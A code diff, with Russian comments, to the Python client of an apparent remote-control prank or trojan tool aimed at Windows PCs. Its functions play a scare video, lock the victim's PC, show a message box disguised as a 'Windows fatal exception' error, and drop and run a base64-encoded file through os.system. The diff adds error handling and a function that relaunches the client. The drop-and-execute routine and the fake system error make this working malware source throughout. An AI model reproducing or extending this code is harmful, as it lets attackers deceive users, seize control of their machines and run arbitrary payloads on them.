@@ -5,6 +5,9 @@ import ctypes
 import base64
 
 
+__test = True
+
+
 def screamer():
     """запускает видео скримера со свинкой пеппой"""
     try:
@@ -57,13 +60,31 @@ def lock_pc():
     return "пк клиента заблокирован"
 
 def message(text):
-    text = ' '.join(text)
-    ctypes.windll.user32.MessageBoxW(0, text, "Windows fatal exception: code 0xc06d007e", 1)
-    return "сообщение доставлено"
+    try:
+        text = ' '.join(text)
+        ctypes.windll.user32.MessageBoxW(0, text, "Windows fatal exception: code 0xc06d007e", 1)
+        return "сообщение доставлено"
+    except Exception as err:
+        print(err)
+        return "при вызове сообщения произошла ошибка"
 
 def drop(name, content):
-    if not os.path.exists(name):
-        with open(name, "wb") as file:
-                file.write(base64.b64decode(content))
-    os.system(name)
+    try:
+        if not os.path.exists(name):
+            with open(name, "wb") as file:
+                    file.write(base64.b64decode(content))
+    except Exception as err:
+        print(err)
+        return "ошибка записи файла при отправке"
+    try:
+        os.system(name)
+    except Exception as err:
+        print(err)
+        return "ошибка при открытии файла"
     return "файл открыт"
+
+def restart_client():
+    """перезапускает клиент"""
+    import  subprocess
+    subprocess.Popen(['python', 'client.py']) if __test == True else os.system('client.exe')
+    return "скрипт клиента перезапущен"
